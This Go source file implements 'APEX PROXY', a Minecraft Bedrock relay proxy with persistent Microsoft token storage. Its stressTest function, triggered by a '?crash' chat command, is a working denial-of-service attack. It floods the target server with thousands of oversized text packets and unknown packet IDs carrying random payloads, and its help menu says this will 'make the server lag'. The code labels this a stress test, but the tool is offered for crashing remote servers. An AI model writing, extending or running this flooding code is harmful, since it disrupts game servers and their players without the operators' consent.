package main

import (
	"bytes"
	"errors"
	"fmt"
	"log"
	"math/rand"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/pelletier/go-toml"
	"github.com/sandertv/gophertunnel/minecraft"
	"github.com/sandertv/gophertunnel/minecraft/auth"
	"github.com/sandertv/gophertunnel/minecraft/protocol/packet"
	"golang.org/x/oauth2"
)

const (
	// Using a data directory to store persistent data that remains across updates
	DATA_DIR    = "apex_data"
	TOKEN_FILE  = "auth_token.toml"
	CONFIG_FILE = "config.toml"
	LOG_FILE    = "apex_proxy.log"
)

// TokenManager handles auth token persistence
type TokenManager struct {
	sync.Mutex
	token         *oauth2.Token
	tokenFilePath string
}

func NewTokenManager(path string) *TokenManager {
	return &TokenManager{
		tokenFilePath: path,
	}
}

func (tm *TokenManager) LoadToken() (*oauth2.Token, error) {
	tm.Lock()
	defer tm.Unlock()

	// Check if we already have a token in memory
	if tm.token != nil {
		return tm.token, nil
	}

	// Try to load from file
	if _, err := os.Stat(tm.tokenFilePath); os.IsNotExist(err) {
		return nil, err
	}

	data, err := os.ReadFile(tm.tokenFilePath)
	if err != nil {
		return nil, err
	}

	var token oauth2.Token
	if err := toml.Unmarshal(data, &token); err != nil {
		return nil, err
	}

	tm.token = &token
	return tm.token, nil
}

func (tm *TokenManager) SaveToken(token *oauth2.Token) error {
	tm.Lock()
	defer tm.Unlock()

	tm.token = token

	// Create directory if it doesn't exist
	dir := filepath.Dir(tm.tokenFilePath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return err
	}

	data, err := toml.Marshal(token)
	if err != nil {
		return err
	}

	return os.WriteFile(tm.tokenFilePath, data, 0644)
}

func (tm *TokenManager) GetOrRequestToken() (*oauth2.Token, error) {
	// Try to load an existing token
	token, err := tm.LoadToken()
	if err != nil {
		log.Printf("No existing token found or error loading token: %v", err)
		log.Printf("Requesting new token via microsoft.com/link flow...")

		// If loading fails, request a new one
		token, err = auth.RequestLiveToken()
		if err != nil {
			return nil, fmt.Errorf("failed to get new token: %v", err)
		}

		// Save the new token
		log.Printf("Successfully obtained new token, saving...")
		if err := tm.SaveToken(token); err != nil {
			log.Printf("Warning: Failed to save token: %v", err)
		}
	} else {
		log.Printf("Successfully loaded existing authentication token")
	}

	return token, nil
}

// wrappedTokenSource wraps an oauth2.TokenSource to persist refreshed tokens
type wrappedTokenSource struct {
	src          oauth2.TokenSource
	tokenManager *TokenManager
}

func (w *wrappedTokenSource) Token() (*oauth2.Token, error) {
	token, err := w.src.Token()
	if err != nil {
		log.Printf("Error getting token from source: %v", err)
		return nil, err
	}

	// Save the refreshed token
	if err := w.tokenManager.SaveToken(token); err != nil {
		log.Printf("Warning: Failed to save refreshed token: %v", err)
	} else {
		log.Printf("Successfully saved refreshed token")
	}

	return token, nil
}

func main() {
	// Ensure data directory exists
	if err := os.MkdirAll(DATA_DIR, 0755); err != nil {
		log.Fatalf("Failed to create data directory: %v", err)
	}

	// Set up logging to file
	logPath := filepath.Join(DATA_DIR, LOG_FILE)
	logFile, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}
	defer logFile.Close()
	log.SetOutput(logFile)

	config := readConfig()
	tokenFilePath := filepath.Join(DATA_DIR, TOKEN_FILE)
	tokenManager := NewTokenManager(tokenFilePath)

	// Get token once at startup, with persistence
	token, err := tokenManager.GetOrRequestToken()
	if err != nil {
		log.Printf("Authentication error: %v", err)
		fmt.Printf("Authentication error: %v\n", err)
		panic(err)
	}

	// Create a refreshing token source that automatically updates our persistent token
	src := auth.RefreshTokenSource(token)
	wrappedSrc := &wrappedTokenSource{
		src:          src,
		tokenManager: tokenManager,
	}

	p, err := minecraft.NewForeignStatusProvider(config.Connection.RemoteAddress)
	if err != nil {
		log.Printf("Failed to create status provider: %v", err)
		panic(err)
	}
	listener, err := minecraft.ListenConfig{
		StatusProvider: p,
	}.Listen("raknet", config.Connection.LocalAddress)
	if err != nil {
		log.Printf("Failed to start listener: %v", err)
		panic(err)
	}
	defer listener.Close()

	fmt.Println("APEX PROXY started and listening on", config.Connection.LocalAddress)
	fmt.Println("Forwarding connections to", config.Connection.RemoteAddress)
	fmt.Println("Type ?help in game chat to see available commands")
	fmt.Println("Authentication token stored in", tokenFilePath)
	fmt.Println("You can now disconnect and reconnect without restarting the proxy")

	// Main connection acceptance loop
	for {
		c, err := listener.Accept()
		if err != nil {
			log.Printf("Error accepting connection: %v", err)
			continue
		}

		// Each connection is handled in its own goroutine
		go handleConn(c.(*minecraft.Conn), listener, config, wrappedSrc)
	}
}

func handleConn(conn *minecraft.Conn, listener *minecraft.Listener, config config, src oauth2.TokenSource) {
	log.Printf("New connection from %s", conn.RemoteAddr())

	// Connect to the remote server
	serverConn, err := minecraft.Dialer{
		TokenSource: src,
		ClientData:  conn.ClientData(),
	}.Dial("raknet", config.Connection.RemoteAddress)
	if err != nil {
		log.Printf("Failed to connect to remote server: %v", err)
		listener.Disconnect(conn, "Failed to connect to remote server: "+err.Error())
		return
	}

	// Make sure connections are closed when this handler exits
	defer serverConn.Close()

	var g sync.WaitGroup
	g.Add(2)
	go func() {
		if err := conn.StartGame(serverConn.GameData()); err != nil {
			log.Printf("Start game error: %v", err)
		}
		g.Done()
	}()
	go func() {
		if err := serverConn.DoSpawn(); err != nil {
			log.Printf("Do spawn error: %v", err)
		}
		g.Done()
	}()
	g.Wait()

	// Send welcome message
	welcomeMsg := &packet.Text{
		Message: "§c[APEX PROXY] §f-> Thanks for using APEX",
	}
	_ = conn.WritePacket(welcomeMsg)

	// Additional welcome message indicating persistent connection feature
	persistentMsg := &packet.Text{
		Message: "§c[APEX PROXY] §f-> You can disconnect and reconnect without proxy restart",
	}
	_ = conn.WritePacket(persistentMsg)

	connClosed := make(chan struct{})

	// Client to server packet handler
	go func() {
		defer func() {
			close(connClosed)
			log.Printf("Client to server connection closed for %s", conn.RemoteAddr())
		}()

		for {
			pk, err := conn.ReadPacket()
			if err != nil {
				return
			}

			if textPk, ok := pk.(*packet.Text); ok {
				if strings.Contains(textPk.Message, "?crash") {
					log.Println("?crash command detected from", conn.RemoteAddr(), "- initiating enhanced stress test")
					fmt.Println("?crash command detected from", conn.RemoteAddr(), "- initiating enhanced stress test")

					notification := &packet.Text{
						Message: "§c[APEX PROXY] §f-> Crash sent.",
					}
					_ = conn.WritePacket(notification)

					go stressTest(serverConn, conn)
					continue
				} else if strings.Contains(textPk.Message, "?help") {
					sendHelpMenu(conn)
					continue
				} else if strings.Contains(textPk.Message, "?auth") {
					authInfo := &packet.Text{
						Message: "§c[APEX PROXY] §f-> Authentication status: Active and stored in " + DATA_DIR,
					}
					_ = conn.WritePacket(authInfo)
					continue
				}
			}

			if err := serverConn.WritePacket(pk); err != nil {
				var disc minecraft.DisconnectError
				if ok := errors.As(err, &disc); ok {
					_ = listener.Disconnect(conn, disc.Error())
				}
				return
			}
		}
	}()

	// Server to client packet handler
	go func() {
		for {
			select {
			case <-connClosed:
				return
			default:
				pk, err := serverConn.ReadPacket()
				if err != nil {
					var disc minecraft.DisconnectError
					if ok := errors.As(err, &disc); ok {
						_ = listener.Disconnect(conn, disc.Error())
					}
					return
				}

				if err := conn.WritePacket(pk); err != nil {
					return
				}
			}
		}
	}()
}

func sendHelpMenu(conn *minecraft.Conn) {
	messages := []string{
		"§c[APEX PROXY] §f== Available Commands ==",
		"§c[APEX PROXY] §f?help - Shows this help menu",
		"§c[APEX PROXY] §f?crash -> Initiates strong packets to the server that will make the server lag",
		"§c[APEX PROXY] §f?auth -> Check authentication status",
	}

	for _, msg := range messages {
		helpMsg := &packet.Text{
			Message: msg,
		}
		_ = conn.WritePacket(helpMsg)
		time.Sleep(time.Millisecond * 100) // Small delay between messages
	}
}

func stressTest(serverConn *minecraft.Conn, clientConn *minecraft.Conn) {
	packetCount := 5000

	// Only send initial notification, no progress updates
	notify := func(message string) {
		msg := &packet.Text{
			Message: fmt.Sprintf("§c[APEX PROXY] §f%s", message),
		}
		_ = clientConn.WritePacket(msg)
	}

	notify("-> Initiating crash...")

	for i := 0; i < packetCount; i++ {
		switch i % 7 {
		case 0, 1, 2:
			for j := 0; j < 5; j++ {
				textPacket := &packet.Text{
					Message: createLargeString(3000 + rand.Intn(2000)),
				}
				_ = serverConn.WritePacket(textPacket)
			}

		case 3, 4:
			for j := 0; j < 10; j++ {
				unknownPacket := &packet.Unknown{
					PacketID: uint32(110 + rand.Intn(40)),
					Payload:  createRandomBytes(1500 + rand.Intn(1000)),
				}
				_ = serverConn.WritePacket(unknownPacket)
			}

		case 5, 6:
			for j := 0; j < 20; j++ {
				textPacket := &packet.Text{
					Message: fmt.Sprintf("§%d[APEX PACKET §%d] §%dTest packet #%d - %s",
						rand.Intn(9)+1,
						rand.Intn(9)+1,
						rand.Intn(9)+1,
						j,
						createLargeString(100)),
				}
				_ = serverConn.WritePacket(textPacket)
			}
		}

		if i%50 == 0 {
			time.Sleep(time.Millisecond * 10)
		}
	}

	log.Println("Stress test completed for", clientConn.RemoteAddr())
	fmt.Println("Stress test completed for", clientConn.RemoteAddr())
}

func createRandomBytes(length int) []byte {
	b := make([]byte, length)
	rand.Read(b)
	return b
}

func createLargeString(length int) string {
	var buffer bytes.Buffer
	chars := "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()"

	for i := 0; i < length; i++ {
		randomIndex := rand.Intn(len(chars))
		buffer.WriteByte(chars[randomIndex])
	}

	return buffer.String()
}

type config struct {
	Connection struct {
		LocalAddress  string
		RemoteAddress string
	}
}

func readConfig() config {
	configPath := filepath.Join(DATA_DIR, CONFIG_FILE)
	c := config{}

	if _, err := os.Stat(configPath); os.IsNotExist(err) {
		// Create data directory if it doesn't exist
		if err := os.MkdirAll(DATA_DIR, 0755); err != nil {
			log.Fatalf("Failed to create data directory: %v", err)
		}

		f, err := os.Create(configPath)
		if err != nil {
			log.Fatalf("create config: %v", err)
		}
		data, err := toml.Marshal(c)
		if err != nil {
			log.Fatalf("encode default config: %v", err)
		}
		if _, err := f.Write(data); err != nil {
			log.Fatalf("write default config: %v", err)
		}
		_ = f.Close()
	}

	data, err := os.ReadFile(configPath)
	if err != nil {
		log.Fatalf("read config: %v", err)
	}

	if err := toml.Unmarshal(data, &c); err != nil {
		log.Fatalf("decode config: %v", err)
	}

	if c.Connection.LocalAddress == "" {
		c.Connection.LocalAddress = "0.0.0.0:19132"
	}

	if c.Connection.RemoteAddress == "" {
		log.Println("Warning: Remote address not set in config.toml")
		log.Println("Please set Connection.RemoteAddress in config.toml")
	}

	data, _ = toml.Marshal(c)
	if err := os.WriteFile(configPath, data, 0644); err != nil {
		log.Fatalf("write config: %v", err)
	}

	return c
}
